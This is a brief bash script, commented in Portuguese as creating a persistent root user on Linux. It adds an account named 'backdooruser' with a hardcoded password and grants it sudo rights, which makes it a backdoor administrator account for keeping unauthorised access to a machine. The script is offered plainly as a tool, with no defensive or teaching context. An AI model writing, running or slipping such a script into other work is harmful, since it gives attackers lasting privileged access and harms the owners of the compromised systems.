#!/bin/bash
# Script para criar usuário root persistente no Linux

useradd backdooruser -m -s /bin/bash
echo "backdooruser:P@ssw0rd123" | chpasswd
usermod -aG sudo backdooruser
